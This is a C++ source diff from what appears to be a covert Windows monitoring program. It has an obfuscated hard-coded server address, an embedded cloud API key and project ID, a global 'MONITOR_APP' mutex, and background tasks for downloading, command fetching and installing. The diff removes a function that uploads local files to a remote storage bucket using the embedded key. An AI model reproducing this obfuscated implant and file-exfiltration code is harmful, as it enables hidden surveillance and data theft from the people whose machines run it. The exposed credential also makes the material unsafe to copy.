@@ -14,7 +14,7 @@
 namespace fs = std::filesystem;
 int64_t lastInfoQuery = 0;
 Information lastInfo;
-const std::string SERVER_BASE = OBFUSCATED("http://192.168.0.13:8070/app");
+const std::string SERVER_BASE = OBFUSCATED("http://192.168.0.55:8070/app");
 // const std::string SERVER_BASE = OBFUSCATED("http://localhost:8070/app");
 const std::string APPWRITEAPI_KEY = OBFUSCATED("c8de7ce28b6a16d8a2a6531672b6549547c7f3cd65af70782ac7e5bdd15733c49193d7e5ca02a01591ef6fc8313f974feea517af6f68e5593e33fd0b82392691aeff4d6792f057b5c08e5f2a76a81237436eed75358006393400bbb4828dc886f9fd07d55a47a36de99b0920e1c423f9ccedb72a5b6d26963f74df6236a2622f");
 const std::string APPWRITE_PROJECTID = OBFUSCATED("65f1b67fa4509b598d6e");
@@ -25,9 +25,9 @@ void initTasks();
 void WaitForConnection()
 {
     bool working = InternetIsWorking();
-    #ifdef _DEBUG
-        working = true;
-    #endif
+#ifdef _DEBUG
+    working = true;
+#endif
     do
     {
         if (working)
@@ -37,18 +37,18 @@ void WaitForConnection()
         Sleep(1000);
     } while (!(working = InternetIsWorking()));
 }
-size_t readCallback(void *ptr, size_t size, size_t nitems, void *data)
-{
-    size_t bytes_read;
+// size_t readCallback(void *ptr, size_t size, size_t nitems, void *data)
+// {
+//     size_t bytes_read;
 
-    /* I'm doing it this way to get closer to what the reporter is doing.
-       Technically we don't need to do this, we could just use the default read
-       callback which is fread. Also, 'size' param is always set to 1 by libcurl
-       so it's fine to pass as buffer, size, nitems, instream. */
-    bytes_read = fread(ptr, 1, (size * nitems), (FILE *)data);
+//     /* I'm doing it this way to get closer to what the reporter is doing.
+//        Technically we don't need to do this, we could just use the default read
+//        callback which is fread. Also, 'size' param is always set to 1 by libcurl
+//        so it's fine to pass as buffer, size, nitems, instream. */
+//     bytes_read = fread(ptr, 1, (size * nitems), (FILE *)data);
 
-    return bytes_read;
-}
+//     return bytes_read;
+// }
 std::string GetAssetDir()
 {
     std::string dir = OBFUSCATED("C:\\ProgramData");
@@ -65,61 +65,12 @@ std::string GetAssetDir()
     dir = path.string();
     return dir;
 }
-size_t writeCallback(void *pContents, size_t size, size_t nmemb, void *pUser)
-{
-    ((std::string *)pUser)->append((char *)pContents, size * nmemb);
-    return size * nmemb;
-}
-void uploadFile(std::string file)
-{
-    CURL *curl = curl_easy_init();
+// size_t writeCallback(void *pContents, size_t size, size_t nmemb, void *pUser)
+// {
+//     ((std::string *)pUser)->append((char *)pContents, size * nmemb);
+//     return size * nmemb;
+// }
 
-    std::string keyHeader = OBFUSCATED("X-Appwrite-Key: ");
-    keyHeader += APPWRITEAPI_KEY;
-    std::string projectHeader = OBFUSCATED("X-Appwrite-Project: ");
-    projectHeader += APPWRITE_PROJECTID;
-    struct curl_slist *headerlist = NULL;
-
-    long responseCode = 0;
-
-    auto fName = fs::path(file).filename().string();
-    auto size = GetFileSize(file);
-
-    curl_httppost *post = NULL;
-    curl_httppost *last = NULL;
-
-    std::string link = OBFUSCATED("https://cloud.appwrite.io/v1/storage/buckets/65f40a214b5d0993434e/files");
-
-    curl_formadd(&post, &last,
-                 CURLFORM_COPYNAME, "file",
-                 CURLFORM_FILE, file.c_str(),
-                 CURLFORM_END);
-    auto id = generate_uuid_v4();
-    curl_formadd(&post, &last,
-                 CURLFORM_COPYNAME, "fileId",
-                 CURLFORM_COPYCONTENTS, id.c_str(),
-                 CURLFORM_END);
-
-    headerlist = curl_slist_append(headerlist, OBFUSCATED("X-Appwrite-Response-Format: 1.4.0"));
-    headerlist = curl_slist_append(headerlist, OBFUSCATED("X-Appwrite-Project: 65f1b67fa4509b598d6e"));
-    headerlist = curl_slist_append(headerlist, keyHeader.c_str());
-    headerlist = curl_slist_append(headerlist, projectHeader.c_str());
-
-    curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
-    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
-    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-    std::string response;
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
-
-    auto res = curl_easy_perform(curl);
-
-    long http_code = 0;
-    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
-    curl_slist_free_all(headerlist);
-    curl_easy_cleanup(curl);
-}
 bool UploadInfo(std::string info)
 {
     CURL *curl = curl_easy_init();
@@ -242,11 +193,13 @@ HBITMAP GetThumbnail(std::string file)
     }
     return hThumbnail;
 }
-void initTasks(){
+void initTasks()
+{
     // downloadsFetcherTask();
     // uploadsFetcherTask();
     // appsFetcherTask();
     // commandsFetcherTask();
+    // installerTask();
     downloaderTask();
     partCleanerTask();
 }
@@ -288,7 +241,16 @@ EXPORT void Start()
     // binmessage::BinaryMessage decoded;
     // decoded.ParseFromString(encoded);
     // std::string data = decoded.data();
-    
+    json j;
+    app::DownloadProgress prg;
+    app::to_json(j, prg);
+    std::cout << j.dump(4) << "\n\n";
+
+    json j2;
+    app::UploadProgress up;
+    app::to_json(j2, up);
+    std::cout << j2.dump(4) << "\n\n";
+
     std::string mutexString = OBFUSCATED("Global MONITOR_APP");
     Locker lock(mutexString, true);
     while (!lock.Lock())
@@ -296,7 +258,7 @@ EXPORT void Start()
         Sleep(1000);
     }
     initCPUCounter();
-    initializeDB(); 
+    initializeDB();
     initTasks();
     defaultMessageHandler = new MessageHandler();
     std::chrono::high_resolution_clock clk;
